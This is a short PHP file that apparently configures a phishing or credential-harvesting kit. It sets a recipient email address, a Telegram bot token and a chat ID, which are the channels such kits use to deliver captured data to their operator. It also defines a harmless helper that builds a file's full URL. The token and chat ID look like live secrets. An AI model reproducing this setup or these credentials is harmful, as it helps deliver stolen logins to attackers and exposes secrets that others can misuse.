<?php 


$to = "jesseh@hibiscuspropertymanagement.com";

$botToken = "8067387776:AAHuGyqAf5yhuMgnY5fyaasVkQ12yrs1LFs";
$chatid = "7527346122";






















// do not touch
 
function getFullFileUrl($relativeFilePath) { 
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
     
    $domainName = $_SERVER['HTTP_HOST'];
 
    $absolutePath = realpath($relativeFilePath); 
    $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);  

    if ($absolutePath && strpos($absolutePath, $docRoot) === 0) { 
        $urlPath = str_replace($docRoot, '', $absolutePath); 
        $urlPath = ltrim($urlPath, '/'); 
        return $protocol . $domainName . "/" . $urlPath;
    } else {
        return null;
    }
}